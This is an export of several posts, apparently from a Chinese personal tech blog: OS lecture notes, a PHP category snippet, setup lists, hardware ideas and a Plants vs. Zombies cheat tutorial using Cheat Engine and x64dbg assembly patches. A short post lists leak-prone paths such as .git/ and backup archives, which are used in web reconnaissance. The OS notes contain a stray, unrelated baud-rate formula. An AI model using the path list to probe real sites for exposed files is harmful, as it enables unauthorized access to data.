    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/</url>
    <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5.pdf" title="操作系统第六节课笔记-进程同步pdf文档下载">操作系统第六节课笔记-进程同步pdf文档下载</a>
<span id="more"></span>
<h1 id="进程同步">进程同步</h1>
<h2 id="并发进程间制约关系">并发进程间制约关系</h2>
<ul>
<li>资源共享关系-间接制约
<ul>
<li>多个今晨彼此无关，完全不知道或只能间接感知其他今春的存在</li>
<li>系统保证个进程能互斥的访问临界资源</li>
<li>系统资源统一分配，而不允许用户进程直接用</li>
</ul></li>
<li>相互合作关系-相互制约
<ul>
<li>系统应保证相互合作的个进程在执行次序上的协调和防止有关时间的差错</li>
</ul></li>
</ul>
<h3 id="临界资源">临界资源</h3>
<ul>
<li>一段时间里只能为某个进程所访问的资源
<ul>
<li>许多物理设备，变量及表格</li>
</ul></li>
</ul>
<h4 id="临界区">临界区</h4>
<ul>
<li>每个进程中访问临界资源的那段代码称为临界区，并不是内存中的一段区域</li>
<li>保证个今晨互斥的进入自己的临界区是实现他们对临界资源的互斥访问的充要条件</li>
</ul>
<h4 id="访问临界资源的循环进程描述">访问临界资源的循环进程描述</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进程Pi</span><br><span class="line">begin</span><br><span class="line">	repeat</span><br><span class="line">	......</span><br><span class="line">	进入区</span><br><span class="line">	临界区</span><br><span class="line">	退出区</span><br><span class="line">	......</span><br><span class="line">	until false；</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<h2 id="进程同步机制准则">进程同步机制准则</h2>
<h3 id="进程同步机制基本准则">进程同步机制基本准则</h3>
<ul>
<li>空闲让进
<ul>
<li>当无进程处于临界区是，课允许请求进入临界区的进程立即进入自己的临界区</li>
</ul></li>
<li>忙则等待
<ul>
<li>当已有进程进入自己的临界区时，所有企图进入进入临界区的进程必须等待</li>
</ul></li>
<li>有限等待
<ul>
<li>对要求访问临界资源的进程，应保证该进程能在有限时间内进入自己的临界区</li>
</ul></li>
<li>让权等待
<ul>
<li>当进程不能进入自己的临界区是，应释放处理机</li>
</ul></li>
</ul>
<h2
id="进程互斥访问临界资源的软件解决方案">进程互斥访问临界资源的软件解决方案</h2>
<h3 id="算法1">算法#1</h3>
<ul>
<li><p>有两个进程Pi，Pj共享某临界资源R</p></li>
<li><p>主程序</p></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">begin</span><br><span class="line">	perbegin //并行执行</span><br><span class="line">	Pi;</span><br><span class="line">	Pj;</span><br><span class="line">	perend;</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<h4 id="设置访问编号">设置访问编号</h4>
<p>设置一个全局的整型变量,如果该变量等于本进程的pid号，则可访问临界区，如果不等于，程序进入循环，执行空操作等待其他进程释放。当进程使用完临界区代码后，全局变量指向另一个进程，使其可以访问临界区</p>
<p>上面的算法属于强制交替访问临界资源，不能灵活考虑进程的实际需求，违背了空闲让进</p>
<h3 id="算法2">算法#2</h3>
<p>每一个进程,设置一个标志,宣誓自己的访问需求</p>
<p>违背了忙则等待</p>
<h3 id="算法3">算法#3</h3>
<p>欲访问标志位,先确认其他进程的访问需求</p>
<p>违背了空闲让进,有限等待</p>
<h3 id="算法4">算法#4</h3>
<p>欲访问标志位和访问标志</p>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>操作系统第四节课笔记-程序执行分析及前趋图</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%9B%9B%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90%E5%8F%8A%E5%89%8D%E8%B6%8B%E5%9B%BE/</url>
    <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%9B%9B%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90%E5%8F%8A%E5%89%8D%E8%B6%8B%E5%9B%BE/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%9B%9B%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90%E5%8F%8A%E5%89%8D%E8%B6%8B%E5%9B%BE.pdf" title="操作系统第四节课笔记-程序执行分析及前趋图pdf文档下载">操作系统第四节课笔记-程序执行分析及前趋图pdf文档下载</a>
<span id="more"></span>
<h1 id="程序执行分析及前趋图">程序执行分析及前趋图</h1>
<h2 id="前趋图概念及举例说明">前趋图概念及举例说明</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[P1]--&gt;B[P2]</span><br><span class="line">A--&gt;C[P3]</span><br><span class="line">A--&gt;D[P4]</span><br><span class="line">B--&gt;E[P5]</span><br><span class="line">C--&gt;E</span><br><span class="line">D--&gt;F[P6]</span><br><span class="line">F--&gt;G[P7]</span><br><span class="line">E--&gt;G</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>前趋后继关系就是依赖关系</strong></li>
<li>后继依赖前驱</li>
<li>P2和P3可以并发</li>
<li>Pi-&gt;Pj
<ul>
<li>称Pi是Pj的直接前趋</li>
<li>称Pj是Pi的直接后继</li>
</ul></li>
</ul>
<h2 id="程序的顺序执行">程序的顺序执行</h2>
<h3 id="程序的构成结构">程序的构成结构</h3>
<ul>
<li><strong>顺序</strong></li>
<li><strong>选择</strong></li>
<li><strong>循环</strong></li>
</ul>
<h3 id="顺序执行的特征">顺序执行的特征</h3>
<ul>
<li>顺序性
<ul>
<li>处理机的操作，严格按照规定顺序执行</li>
</ul></li>
<li>封闭性
<ul>
<li>封闭环境下运行，对系统资源独占</li>
<li>只有当前程序才能改变资源状态</li>
<li>执行结果不受外界影响(debug除外)</li>
</ul></li>
<li>可再现性
<ul>
<li>只要环境和条件相同，程序的结果相同</li>
</ul></li>
</ul>
<h3 id="程序的顺序性使其变得易于维护">程序的顺序性使其变得易于维护</h3>
<h2 id="程序的并发执行">程序的并发执行</h2>
<h4 id="一段时间内共享计算机资源">一段时间内共享计算机资源</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[S1]--&gt;C[S3]</span><br><span class="line">B[S2]--&gt;C</span><br><span class="line">C--&gt;D[S4]</span><br></pre></td></tr></table></figure>
<h4
id="s1或s2谁先执行都可以因为他们没有前趋没有依赖关系可以并发执行">S1或S2谁先执行都可以，因为他们没有前趋，没有依赖关系，可以并发执行</h4>
<h4
id="只有s1s2执行结束后s3才能执行s3执行结束后s4才能执行">只有S1S2执行结束后S3才能执行，S3执行结束后，S4才能执行</h4>
<h3 id="并发时的特征">并发时的特征</h3>
<ul>
<li>间断性
<ul>
<li><strong>执行-&gt;暂停执行-&gt;执行</strong>的活动规律</li>
</ul></li>
<li>失去封闭性
<ul>
<li>因为共享系统资源，每个程序都可能对系统资源行程改变，程序一定受其他运行程序影响</li>
</ul></li>
<li>不可再现性
<ul>
<li>程序可能受到其他程序影响，资源都有可能发生变动</li>
</ul></li>
</ul>
<h4
id="要想实现程序间并发执行结果可再现区别于静态描述程序的动态描述结果">要想实现程序间并发执行结果可再现，区别于静态描述程序的动态描述结果</h4>
<h2 id="进程的定义及特征">进程的定义及特征</h2>
<h3 id="进程的引入">进程的引入</h3>
<ul>
<li>并发、共享及多程序环境</li>
<li>基于程序的概念已不能完整、有效的描述并发在内存中的运行状态</li>
<li>必须建立并发程序的新的描述和控制机制</li>
<li>基于程序段、数据段和进程控制块而引入进程的概念以对应程序的运行过程</li>
<li>进程控制块存放了进程标识符、进程运行的当前状态、程序和数据的地址以及关于该程序运行时的CPU环境信息</li>
</ul>
<h3 id="进程的定义">进程的定义</h3>
<ul>
<li>进程是可并发执行的程序在一个数据集合上的进行过程，亦即进程实体的运行过程
<ul>
<li>进程实体由程序段，数据段及进程控制块三部分构成</li>
</ul></li>
<li>进程是系统进行资源分配和调度的一个独立单位</li>
</ul>
<h3 id="进程和程序的区别于联系">进程和程序的区别于联系</h3>
<ul>
<li>结构特征
<ul>
<li>程序段、数据段及进程控制块</li>
</ul></li>
<li>动态性
<ul>
<li>生命周期及<strong>执行</strong>本质</li>
</ul></li>
<li>并发性
<ul>
<li>共存于内存、宏观同时运行</li>
</ul></li>
<li>独立性
<ul>
<li>调度、资源分配、运行</li>
</ul></li>
<li>异步性
<ul>
<li>推进相互独立、速度不可知</li>
</ul></li>
</ul>
<h2 id="进程状态及状态转换图">进程状态及状态转换图</h2>
<h3 id="进程的基本状态及状态转换">进程的基本状态及状态转换</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph TD</span><br><span class="line">D[新状态]--&gt;|接纳|A</span><br><span class="line">A[就绪状态]--&gt;|调度|B[运行状态]--&gt;|I/O请求或等某事件|C[阻塞状态]--&gt;|I/O完成或时间发生|A</span><br><span class="line">B--&gt;|超时|A</span><br><span class="line">B--&gt;|结束|E[中止状态]</span><br></pre></td></tr></table></figure>
<h4 id="三种核心状态">三种核心状态</h4>
<ul>
<li><p>检查资源，对进程记账</p>
<p>其中<span class="math inline">\(I\)</span> 为传信率，<span
class="math inline">\(S\)</span> 为波特率，<span
class="math inline">\(N\)</span> 为每个码元负载的信息量，而<span
class="math inline">\(\log _{2}{N}\)</span>以比特为单位。</p>
<p>就绪状态</p></li>
<li><p>运行状态</p></li>
<li><p>阻塞状态</p></li>
</ul>
<h4 id="状态特性">状态特性</h4>
<ul>
<li>单向
<ul>
<li>运行-&gt;阻塞-&gt;就绪</li>
</ul></li>
<li>双向
<ul>
<li>运行-&gt;就绪</li>
<li>就绪-&gt;运行</li>
</ul></li>
</ul>
<h3 id="进程的父子关系">进程的父子关系</h3>
<ul>
<li>子进程由父进程fork出来</li>
</ul>
<h4 id="僵尸进程">僵尸进程</h4>
<ul>
<li>一个进程结束了，但是他的父进程没有等待（调用wait /
waitpid）他，那么他将变成一个僵尸进程</li>
</ul>
<h4 id="孤儿进程">孤儿进程</h4>
<ul>
<li>父进程调用两次fork，杀死子进程。剩下的孙子进程会成为孤儿进程，孤儿进程由init程序进行处理。
因为init是一切进程的父进程。</li>
</ul>
<h3 id="引入程序挂起状态">引入程序挂起状态</h3>
<ul>
<li>终端用户的请求
<ul>
<li>发现问题</li>
</ul></li>
<li>父进程的请求
<ul>
<li>考察、修改或协调子进程</li>
</ul></li>
<li>操作系统的需要
<ul>
<li>检查资源，对进程记账</li>
</ul></li>
<li>负载调节
<ul>
<li>保证实时系统正常运行</li>
</ul></li>
</ul>
<h2 id="unix进程状态转换图">UNIX进程状态转换图</h2>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/unix_进程转换图.jpg" /></p>
<h2 id="linux进程状态转换图">Linux进程状态转换图</h2>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/linux_进程转换图.jpg" /></p>
<h1 id="课后习题">课后习题</h1>
<ol type="1">
<li>程序在独占处理器的情况下运行时。将会体现出顺序性的执行特征，这是指<strong>处理机的操作，严格按照规定顺序执行</strong></li>
<li>现在操作系统中，<strong>进程</strong>是系统实施内存资源分配和管理的一个独立实体。</li>
<li>与程序相比，进程是一个动态的概念，具有一定的生命周期，并支持多道程序并发执行。关于并发说法最准确的说法是<strong>多道程序同时进入内存，并在宏观上（即一段时间内）同时运行</strong></li>
<li>关于进程各种基本状态之间的转化，不可能直接发生的状态转化为<strong>阻塞状态=&gt;运行状态</strong></li>
<li>进程在<strong>系统采用时间片轮转调度算法且分配给进程的时间片用完</strong>的条件下，将会从运行状态转化为就绪状态。</li>
<li>关于进场的状态转换，引入挂起状态的的原因不包括<strong>进程进行I/O操作室应保证处理器的高效利用</strong>。</li>
<li>下面对进程的描述中，错误的是
<ol type="1">
<li>晋城市动态的概念（√）</li>
<li>进程的执行需要处理机（√）</li>
<li>进程具有生命周期（√）</li>
<li><strong>进程是指令的集合（进程里面还包含栈/堆等数据结构的非指令结构×）</strong></li>
</ol></li>
<li>在进程管理时，当<strong>等待的事件出现</strong>时，进程从阻塞状态变为就绪状态。</li>
<li>分配到必要的资源并获得处理机时的进程状态是<strong>执行状态</strong>。</li>
<li>一个进程用完了分配给它的时间片后，它的状态变为<strong>就绪状态</strong>。</li>
<li>操作系统通过<strong>PCB</strong>对进程进行管理。
<ol type="1">
<li>PCB：进程控制块(Processing Control Block)</li>
</ol></li>
<li>关于进程的状态转换，当进程处于<strong>普通阻塞状态</strong>的情况下，不可能直接转化为挂起就绪状态。</li>
<li>多到程序环境下，操作系统分配资源以<strong>进程</strong>为基本单位。</li>
<li>进程的<strong>动态性</strong>和并发性是两个很重要的属性。</li>
<li>进程被创建后即进入<strong>就绪队列</strong>排队。</li>
</ol>
]]></content>
      <categories>
        <category>大学</category>
      </categories>
  </entry>
  <entry>
    <title>数据库表设计</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h3 id="无限分类">无限分类</h3>
<p>无限分类类似于磁盘中linux的文件查找机制 表的设计可以简化为
id-&gt;就是id啊 pid-&gt;父级id</p>
<p>高级一点,也方便查找的数据表结构可以新增一个字段
path-&gt;递归记录父类id,包括祖id</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//这是一个控制器,用来接收post参数</span></span><br><span class="line">	<span class="variable">$name</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">	<span class="variable">$pid</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pid&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$pid</span>))&#123;</span><br><span class="line">		<span class="keyword">do</span>&#123;</span><br><span class="line">			<span class="variable">$pid</span>=<span class="title function_ invoke__">db</span>(goods)-&gt;<span class="title function_ invoke__">limit</span>([<span class="string">&#x27;pid&#x27;</span>=&gt;<span class="variable">$pid</span>])-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">			<span class="variable">$path</span>=<span class="variable">$pid</span>.<span class="variable">$path</span>;</span><br><span class="line">		&#125;<span class="keyword">while</span>(<span class="variable">$pid</span>!=<span class="number">0</span>);</span><br><span class="line">		<span class="variable">$id</span>=<span class="title function_ invoke__">db</span>(goods)-&gt;<span class="title function_ invoke__">save</span>([<span class="string">&#x27;name&#x27;</span>=&gt;<span class="variable">$name</span>,<span class="string">&#x27;pid&#x27;</span>=&gt;<span class="variable">$pid</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="variable">$path</span>]); </span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$id</span>=<span class="title function_ invoke__">db</span>(goods)-&gt;<span class="title function_ invoke__">save</span>([<span class="string">&#x27;name&#x27;</span>=&gt;<span class="variable">$name</span>,<span class="string">&#x27;pid&#x27;</span>=&gt;<span class="number">0</span>]);<span class="comment">//需要设定$path默认为零,也就是说,如果没有传入path,他就是一个根分类</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>(<span class="variable">$id</span>);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
  </entry>
  <entry>
    <title>文件泄露</title>
    <url>/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">git:</span><br><span class="line">    .git/</span><br><span class="line">mac:</span><br><span class="line">    .ds_store</span><br><span class="line">vim:</span><br><span class="line">    .*.swp</span><br><span class="line">备份文件</span><br><span class="line">    *.zip</span><br><span class="line">    *.tar</span><br><span class="line">    *.tar.gz</span><br><span class="line">    *.bak</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux知识</category>
      </categories>
  </entry>
  <entry>
    <title>新电脑安装流程</title>
    <url>/%E6%96%B0%E7%94%B5%E8%84%91%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="流程">流程</h1>
<span id="more"></span>
<h2 id="安装的软件">安装的软件</h2>
<ol type="1">
<li>安装uninstall tools 用于追踪安装</li>
<li>安装Microsoft Store</li>
<li>安装scoop,配置安装路径</li>
<li>使用scoop安装sudo</li>
<li>使用scoop安装vscode</li>
<li>使用scoop安装anaconda</li>
<li>使用scoop安装maven</li>
<li>使用scoop安装nodejs</li>
<li>安装listory</li>
<li>安装Rolan</li>
<li>安装Idea</li>
<li>安装Pycharm</li>
<li>安装Keli</li>
<li>安装Eclipse</li>
<li>安装CubeIDE</li>
<li>安装Linux子系统v2</li>
<li>安装watt toolkit</li>
<li>安装Cancrack并配置安装路径</li>
<li>安装腾讯软件管家</li>
<li>安装java</li>
<li>安装vs</li>
</ol>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>时间管理智能设备</title>
    <url>/%E6%97%B6%E9%97%B4%E7%AE%A1%E7%90%86%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/</url>
    <content><![CDATA[<h3
id="近来还有一件想做的东西就是时间管理设备了">近来还有一件想做的东西，就是时间管理设备了</h3>
<h4
id="我想用全志h6芯片做一个嵌入式设备使用linux系统使用-pocketsphinx对麦克风实时监听当听到关键词后开始进行文本录入或者做成表格便于对今天的一天进行统计">我想用全志H6芯片做一个嵌入式设备，使用linux系统，使用
pocketsphinx对麦克风实时监听，当听到关键词后开始进行文本录入，或者做成表格，便于对今天的一天进行统计</h4>
<ul>
<li>硬件
<ul>
<li>全志A64芯片-H6</li>
<li>麦克风</li>
<li>蓝牙模块</li>
<li>wifi模块</li>
<li>电源</li>
<li>tf卡槽</li>
<li>emmc存储器</li>
<li>ddr3内存</li>
</ul></li>
<li>软件
<ul>
<li>linux移植</li>
<li>uboot移植</li>
<li>pocketsphinx <span id="more"></span></li>
</ul></li>
</ul>
<h3 id="pocketsphinx编译安装">pocketsphinx编译安装</h3>
<ol type="1">
<li><p>拉一个docker镜像,安装相关软件</p>
<ol type="1">
<li><div class="sourceCode" id="cb1"><pre
class="sourceCode yaml"><code class="sourceCode yaml"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="at">docker pull ubuntu</span></span>
<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="at">docker run -itd --name=pocketsphinx ubuntu bash </span></span>
<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="at">docker exec -itd pocketsphinx bash</span></span></code></pre></div></li>
<li></li>
</ol></li>
<li></li>
</ol>
<h3 id="流程">流程</h3>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/语音助手_v1.png" /></p>
<h2 id="参考资料">参考资料</h2>
<a href="/%E6%97%B6%E9%97%B4%E7%AE%A1%E7%90%86%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/Manual.pdf" title="Manual.pdf">Manual.pdf</a>
<a href="/%E6%97%B6%E9%97%B4%E7%AE%A1%E7%90%86%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/DataSheet.pdf" title="DataSheet.pdf">DataSheet.pdf</a>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
  </entry>
  <entry>
    <title>无线电发射器</title>
    <url>/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%8F%91%E5%B0%84%E5%99%A8/</url>
    <content><![CDATA[
<span id="more"></span>
<h3 id="原理">原理：</h3>
<p>三极管与线圈和可变电容器构成了一个振荡电路，振荡电路的作用呢就是可以输出高频电流，这个高频电流的频率能够随声音变化而变化。振荡的中心频率由线圈跟可变电容数值来决定。电源和电阻给三极管和驻极体话筒供电。当话筒输出的音频电压加到三极管的发射极时发射极电流发生变化，振荡频率会随音频信号变化，从而达到调频的目的。调频后的高频电流经电容器C2通过天线发射出去。</p>
<h2
id="私制无线电信号设备违法请申请批准">私制无线电信号设备违法,请申请批准</h2>
]]></content>
      <categories>
        <category>无线电</category>
      </categories>
  </entry>
  <entry>
    <title>植物大战僵尸外挂编写教程</title>
    <url>/%E6%A4%8D%E7%89%A9%E5%A4%A7%E6%88%98%E5%83%B5%E5%B0%B8%E5%A4%96%E6%8C%82%E7%BC%96%E5%86%99%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="教程">教程</h1>
<h3 id="阳光数修改">阳光数修改</h3>
<ol type="1">
<li><p>通过CE找到基址,规律就是,第一步找到<code>mov eax,[]</code>类型的,第二部是根据第一部中括号中的寄存器变量,寻找<code>mov 括号中的寄存器名,[]</code>,后面以此类推,例如第一步是<code>mov eax,[esi+00005560]</code>,那么第二步就寻找<code>mov esi,[]</code>。这里有一个规律就是，当静态地址和动态地址都在结果范围中时，优先查看静态基址。</p>
<ol type="1">
<li><p>第一次查找到动态地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EAX=0000004B</span><br><span class="line">EBX=00000001</span><br><span class="line">ECX=00000000</span><br><span class="line">EDX=13DE97B0</span><br><span class="line">ESI=1627F418</span><br><span class="line">EDI=13D17888</span><br><span class="line">EBP=0019FA98</span><br><span class="line">ESP=00199790</span><br><span class="line">EIP=0048982B</span><br><span class="line"></span><br><span class="line">指针基址可能是 =1627F418</span><br><span class="line"></span><br><span class="line">0048981D - test al,al</span><br><span class="line">0048981F - jne 00489933</span><br><span class="line">00489825 - mov eax,[esi+00005560]</span><br><span class="line">0048982B - xor ecx,ecx</span><br><span class="line">0048982D - test eax,eax</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>第二次查找到动态地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EAX=00452650</span><br><span class="line">EBX=0019FD00</span><br><span class="line">ECX=02BD1B08</span><br><span class="line">EDX=00667BA0</span><br><span class="line">ESI=1627F418</span><br><span class="line">EDI=02BD1B08</span><br><span class="line">EBP=00000001</span><br><span class="line">ESP=0019FC60</span><br><span class="line">EIP=00452679</span><br><span class="line"></span><br><span class="line">指针基址可能是 =02BD1B08</span><br><span class="line"></span><br><span class="line">0045266A - cmp byte ptr [edi+000004CF],00</span><br><span class="line">00452671 - je 0045269B</span><br><span class="line">00452673 - mov esi,[edi+00000768]</span><br><span class="line">00452679 - test esi,esi</span><br><span class="line">0045267B - je 0045269B</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>第三次查找到基址(静态地址)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EAX=00007022</span><br><span class="line">EBX=FFFFFFFF</span><br><span class="line">ECX=001996B0</span><br><span class="line">EDX=7FFFFFFF</span><br><span class="line">ESI=02BD1B08</span><br><span class="line">EDI=FFFFFFFF</span><br><span class="line">EBP=00000000</span><br><span class="line">ESP=001995C8</span><br><span class="line">EIP=00487F6B</span><br><span class="line"></span><br><span class="line">指针基址可能是 =006A9EC0</span><br><span class="line"></span><br><span class="line">00487F55 - mov byte ptr [esp+64],00</span><br><span class="line">00487F5A - mov [esp+000000F0],00000001</span><br><span class="line">00487F65 - mov esi,[006A9EC0]</span><br><span class="line">00487F6B - mov eax,[esi+00000768]</span><br><span class="line">00487F71 - test eax,eax</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol></li>
<li><p>阳光静态基址。<img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220620012111773.png"
alt="image-20220620012111773" /></p></li>
<li><p>这时无论代码什么时候运行，都能定位到对应的地址。修改对应地址的数据即可修改阳光数。</p></li>
</ol>
<h3 id="破解阳光增加减少事件">破解阳光增加减少事件</h3>
<ol type="1">
<li><p>右键基址，查看是谁修改了了内存中阳光数量对应的数据。</p>
<ol type="1">
<li><p>阳光数减少事件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EAX=0000004B</span><br><span class="line">EBX=00000032</span><br><span class="line">ECX=FFFFFFFF</span><br><span class="line">EDX=189B3760</span><br><span class="line">ESI=00000019</span><br><span class="line">EDI=189B3760</span><br><span class="line">EBP=189B3760</span><br><span class="line">ESP=0019FB70</span><br><span class="line">EIP=0041BA7C</span><br><span class="line"></span><br><span class="line">指针基址可能是 =189B3760</span><br><span class="line"></span><br><span class="line">0041BA72 - jg 0041BA80</span><br><span class="line">0041BA74 - sub esi,ebx</span><br><span class="line">0041BA76 - mov [edi+00005560],esi</span><br><span class="line">0041BA7C - mov al,01</span><br><span class="line">0041BA7E - pop esi</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>阳光数增加事件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EAX=189B3760</span><br><span class="line">EBX=00000001</span><br><span class="line">ECX=00000019</span><br><span class="line">EDX=D5820009</span><br><span class="line">ESI=191511F0</span><br><span class="line">EDI=189B3760</span><br><span class="line">EBP=0019F9D8</span><br><span class="line">ESP=0019F968</span><br><span class="line">EIP=00430A17</span><br><span class="line"></span><br><span class="line">指针基址可能是 =189B3760</span><br><span class="line"></span><br><span class="line">00430A0B - and ecx,32</span><br><span class="line">00430A0E - mov eax,[esi+04]</span><br><span class="line">00430A11 - add [eax+00005560],ecx</span><br><span class="line">00430A17 - mov ecx,[eax+00005560]</span><br><span class="line">00430A1D - cmp ecx,00002706</span><br></pre></td></tr></table></figure></li>
</ol></li>
<li><p>此时我们介入x64dbg，对对应位置的汇编进行分析。</p>
<ol type="1">
<li><p>附加到进程，点击符号标签页，找到植物大战僵尸符号位置，双击进入。使用<code>Ctrl+G</code>跳转至汇编代码位置。先跳转至减少阳光的位置<code>0041BA76</code>,找到对应子函数的头，设置断点，回到游戏，使用阳光以触发断点。<img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220620014209328.png" /></p></li>
<li><p>可以看到目前所有阳光数为100，向日葵所需阳光数为50。<img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/image-20220620014445460.png" /></p></li>
<li><p>找到一处空白地址，写入原来的子程序中的指令，但是稍加修改，讲esi固定为0x2706也就是9990，为本游戏上限，当然也可以在增加阳光的子程序中解除此功能的判断，就可以做到阳光无上限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">006510EB | BE 06270000      | mov esi,0x2706                        |</span><br><span class="line">006510F0 | 89B7 60550000    | mov dword ptr ds:[edi+0x5560],esi     |</span><br><span class="line">006510F6 | B0 01            | mov al,0x1                            |</span><br><span class="line">006510F8 | 5E               | pop esi                               |</span><br><span class="line">006510F9 | E9 81A9DCFF      | jmp plantsvszombies.41BA7F            |</span><br></pre></td></tr></table></figure></li>
<li><p>原汇编指令集修改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0041BA60 | 56               | push esi                              |</span><br><span class="line">0041BA61 | 8BB7 60550000    | mov esi,dword ptr ds:[edi+0x5560]     | edi+5560:&quot;P\&quot;?&quot;</span><br><span class="line">0041BA67 | 8BD7             | mov edx,edi                           |</span><br><span class="line">0041BA69 | E8 12FFFFFF      | call &lt;plantsvszombies.sub_41B980&gt;     |</span><br><span class="line">0041BA6E | 03C6             | add eax,esi                           | 剩余阳光数</span><br><span class="line">0041BA70 | 3BD8             | cmp ebx,eax                           | 消费阳光数</span><br><span class="line">0041BA72 | 7F 0C            | jg plantsvszombies.41BA80             |</span><br><span class="line">0041BA74 | E9 72562300      | jmp plantsvszombies.6510EB            |</span><br><span class="line">0041BA79 | 90               | nop                                   |</span><br><span class="line">0041BA7A | 90               | nop                                   |</span><br><span class="line">0041BA7B | 90               | nop                                   |</span><br><span class="line">0041BA7C | 90               | nop                                   |</span><br><span class="line">0041BA7D | 90               | nop                                   |</span><br><span class="line">0041BA7E | 90               | nop                                   |</span><br><span class="line">0041BA7F | C3               | ret                                   |</span><br><span class="line">0041BA80 | 8B8F 8C000000    | mov ecx,dword ptr ds:[edi+0x8C]       | 异常链,当阳光数小于植物消耗的阳光</span><br><span class="line">0041BA86 | 8B01             | mov eax,dword ptr ds:[ecx]            |</span><br><span class="line">0041BA88 | 8B15 607B6A00    | mov edx,dword ptr ds:[0x6A7B60]       |</span><br><span class="line">0041BA8E | 8B80 D8000000    | mov 